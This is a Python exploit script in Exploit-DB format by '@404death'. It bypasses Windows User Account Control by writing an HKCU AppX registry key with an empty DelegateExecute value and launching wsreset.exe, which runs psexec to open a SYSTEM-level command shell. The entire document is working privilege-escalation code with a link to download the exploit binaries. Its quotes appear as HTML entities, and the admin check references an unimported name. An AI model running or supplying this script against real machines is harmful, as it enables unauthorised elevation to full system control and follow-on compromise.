#### @404death
#### base on : https://www.activecyber.us/activelabs/windows-uac-bypass
#
## EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47754.zip
#
import sys, os
from ctypes import *
import _winreg
CMD                   = r"C:\Windows\System32\cmd.exe"
WS_RESET              = r&#039;C:\Windows\System32\wsreset.exe&#039;
#PYTHON_CMD           = "python"
test_cmd              = " -i -s cmd.exe"
SYSTEM_SHELL          = "psexec.exe"  # to get nt\system   
REG_PATH              = &#039;Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command&#039;
DELEGATE_EXEC_REG_KEY = &#039;DelegateExecute&#039;
def is_running_as_admin():
    &#039;&#039;&#039;
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    &#039;&#039;&#039;    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def create_reg_key(key, value):
    &#039;&#039;&#039;
    Creates a reg key
    &#039;&#039;&#039;
    try:        
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)                
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
        _winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
def bypass_uac(cmd):
    &#039;&#039;&#039;
    Tries to bypass the UAC
    &#039;&#039;&#039;
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, &#039;&#039;)
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
def execute():        
    if not is_running_as_admin():
        print &#039;[!] Fileless UAC Bypass via Windows Store by @404death &#039;
        print &#039;[+] Trying to bypass the UAC&#039;
        print &#039;[+] Waiting to get SYSTEM shell !!!&#039;
        try:                
            current_dir = os.path.dirname(os.path.realpath(__file__)) + &#039;\\&#039; + SYSTEM_SHELL
            cmd = &#039;{} /c {} {}&#039;.format(CMD, current_dir, test_cmd)
            bypass_uac(cmd)                
            os.system(WS_RESET)
            print &#039;[+] Pwnedd !!! you g0t system shell !!!&#039;                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        print &#039;[+] xailay !!!&#039;        
if __name__ == &#039;__main__&#039;:
    execute()

